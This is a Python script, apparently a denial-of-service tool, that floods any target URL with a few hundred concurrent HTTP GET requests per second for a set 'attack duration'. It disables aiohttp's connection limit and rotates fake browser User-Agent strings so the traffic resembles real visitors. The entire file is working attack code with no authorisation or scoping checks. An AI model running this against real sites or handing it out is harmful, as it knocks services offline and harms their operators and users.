import asyncio
import aiohttp
import argparse
import time
import random
from colorama import Fore, Style  # Add these imports

parser = argparse.ArgumentParser(description="A simple stressor.")
parser.add_argument("url", type=str, help="The target URL.")
parser.add_argument("--duration", type=int, default=100, help="Total attack duration in seconds.")
parser.add_argument("--requests_per_second", type=int, default=200, help="Requests per second rate.")
parser.add_argument("--total_requests", type=int, default=None, help="Total number of requests to be sent (optional).")
args = parser.parse_args()

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
    # Add more User-Agents as needed
]

async def send_requests(url, duration, requests_per_second, total_requests=None):
    start_time = time.time()
    end_time = start_time + duration
    request_count = 0

    connector = aiohttp.TCPConnector(limit=0)  # Configuration to disable connection limit

    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []

        while time.time() < end_time and (total_requests is None or request_count < total_requests):
            for _ in range(requests_per_second):
                tasks.append(asyncio.create_task(send_request(session, url)))
                request_count += 1

            await asyncio.gather(*tasks)
            tasks = []  # Clear the tasks list for the next iteration

            # Adjust the sleep time as needed
            await asyncio.sleep(1.0 / requests_per_second)

    elapsed_time = time.time() - start_time
    print(f"Total requests sent: {request_count}, Elapsed time: {elapsed_time:.2f} seconds")

async def send_request(session, url):
    try:
        user_agent = random.choice(USER_AGENTS)
        headers = {'User-Agent': user_agent}
        async with session.get(url, headers=headers) as response:
            # Add logic here to process the response if necessary
            pass
    except aiohttp.ClientError as e:
        print(f"{Fore.RED}Error sending request: {e}{Style.RESET_ALL}")  # Add red formatting

if __name__ == "__main__":
    asyncio.run(send_requests(args.url, args.duration, args.requests_per_second, args.total_requests))
